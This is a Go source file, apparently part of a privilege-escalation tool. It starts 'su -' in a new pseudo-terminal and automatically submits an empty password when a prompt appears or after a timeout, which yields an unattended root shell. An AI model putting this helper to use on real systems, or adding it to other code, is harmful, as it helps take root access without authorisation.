package main

// PTY bridge — spawns /usr/bin/su inside a fresh PTY and bridges
// the user's tty to it.

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/unix"
)

func runRootPTY() error {
	master, err := os.OpenFile("/dev/ptmx", os.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		return fmt.Errorf("open /dev/ptmx: %w", err)
	}

	var unlock int32
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, master.Fd(),
		unix.TIOCSPTLCK, uintptr(unsafe.Pointer(&unlock))); errno != 0 {
		master.Close()
		return fmt.Errorf("unlockpt: %w", errno)
	}

	var ptsNum uint32
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, master.Fd(),
		unix.TIOCGPTN, uintptr(unsafe.Pointer(&ptsNum))); errno != 0 {
		master.Close()
		return fmt.Errorf("ptsname: %w", errno)
	}
	slaveName := fmt.Sprintf("/dev/pts/%d", ptsNum)

	var ws unix.Winsize
	if ws2, err2 := unix.IoctlGetWinsize(syscall.Stdin, unix.TIOCGWINSZ); err2 == nil {
		ws = *ws2
		unix.IoctlSetWinsize(int(master.Fd()), unix.TIOCSWINSZ, &ws) //nolint
	}

	cmd := exec.Command("su", "-")
	slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
	if err != nil {
		master.Close()
		return fmt.Errorf("open slave %s: %w", slaveName, err)
	}

	cmd.Stdin = slave
	cmd.Stdout = slave
	cmd.Stderr = slave
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true, Setctty: true, Ctty: 0}

	if err := cmd.Start(); err != nil {
		slave.Close()
		master.Close()
		return fmt.Errorf("start su: %w", err)
	}
	slave.Close()

	var savedTermios unix.Termios
	restoreTermios := false
	if err := unix.IoctlSetTermios(syscall.Stdin, unix.TCGETS, &savedTermios); err == nil {
		raw := savedTermios
		unix.IoctlSetTermios(syscall.Stdin, unix.TCSETS, makeRaw(&raw)) //nolint
		restoreTermios = true
	}
	defer func() {
		if restoreTermios {
			unix.IoctlSetTermios(syscall.Stdin, unix.TCSETS, &savedTermios) //nolint
		}
		master.Close()
	}()

	masterFd := int(master.Fd())
	autoPWSent := false
	stdinEOF := false
	buf := make([]byte, 4096)
	totalMs := 0

	for {
		pfds := []unix.PollFd{
			{Fd: int32(syscall.Stdin), Events: unix.POLLIN},
			{Fd: int32(masterFd), Events: unix.POLLIN},
		}
		if stdinEOF {
			pfds[0].Fd = -1
		}

		_, err := unix.Poll(pfds, 200)
		if err != nil && err != syscall.EINTR {
			break
		}
		totalMs += 200

		if pfds[1].Revents&unix.POLLIN != 0 {
			n, err := syscall.Read(masterFd, buf)
			if n <= 0 || err != nil {
				break
			}
			os.Stdout.Write(buf[:n]) //nolint
			if !autoPWSent {
				s := string(buf[:n])
				if contains(s, "assword") || contains(s, "assphrase") || contains(s, "ot de passe") {
					syscall.Write(masterFd, []byte("\n")) //nolint
					autoPWSent = true
				}
			}
		}

		if !stdinEOF && pfds[0].Revents&unix.POLLIN != 0 {
			n, err := syscall.Read(syscall.Stdin, buf)
			if n <= 0 || err != nil {
				stdinEOF = true
			} else {
				syscall.Write(masterFd, buf[:n]) //nolint
			}
		}

		if pfds[1].Revents&(unix.POLLHUP|unix.POLLERR) != 0 {
			break
		}

		if !autoPWSent && totalMs >= 1500 {
			syscall.Write(masterFd, []byte("\n")) //nolint
			autoPWSent = true
		}

		var wst syscall.WaitStatus
		if pid, _ := syscall.Wait4(cmd.Process.Pid, &wst, syscall.WNOHANG, nil); pid == cmd.Process.Pid {
			for i := 0; i < 5; i++ {
				pf := []unix.PollFd{{Fd: int32(masterFd), Events: unix.POLLIN}}
				if n2, _ := unix.Poll(pf, 50); n2 <= 0 {
					break
				}
				n2, _ := syscall.Read(masterFd, buf)
				if n2 <= 0 {
					break
				}
				os.Stdout.Write(buf[:n2]) //nolint
			}
			break
		}
	}
	return nil
}

func makeRaw(t *unix.Termios) *unix.Termios {
	raw := *t
	raw.Iflag &^= unix.IGNBRK | unix.BRKINT | unix.PARMRK | unix.ISTRIP |
		unix.INLCR | unix.IGNCR | unix.ICRNL | unix.IXON
	raw.Oflag &^= unix.OPOST
	raw.Lflag &^= unix.ECHO | unix.ECHONL | unix.ICANON | unix.ISIG | unix.IEXTEN
	raw.Cflag &^= unix.CSIZE | unix.PARENB
	raw.Cflag |= unix.CS8
	raw.Cc[unix.VMIN] = 1
	raw.Cc[unix.VTIME] = 0
	return &raw
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsStr(s, sub))
}

func containsStr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

var _ = unsafe.Pointer(nil)
